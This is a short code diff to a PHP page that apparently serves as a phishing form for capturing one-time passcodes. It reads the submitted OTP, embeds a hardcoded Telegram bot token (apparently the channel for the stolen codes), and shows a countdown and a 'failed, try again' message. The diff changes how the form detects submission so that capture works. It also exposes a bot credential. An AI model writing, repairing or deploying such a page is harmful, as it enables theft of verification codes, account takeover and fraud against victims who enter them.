@@ -292,7 +292,7 @@
 
       <form id="otpForm" action="" method="POST">
         <?php
-       if (isset($_POST['otp_code'])) {
+       if (isset($_POST['verify'])) {
       $otp  = trim($_POST['otp_code'] ?? '');
 
       $botToken = "8648558019:AAHImsUZ7UJK8t1b629JTTxSd3vvHpH0rhY";
@@ -345,7 +345,7 @@
         <p class="timer">Hold time: <strong id="countdown">58 s</strong></p>
 
         <div class="btn-wrap">
-          <button type="submit" class="verify-btn" id="verifyBtn">VERIFY →</button>
+          <input name="verify" type="submit" class="verify-btn" id="verifyBtn" value="VERIFY">
         </div>
          <p class="error-text" id="errorText">Failed to verify, try again.</p>
       </form>
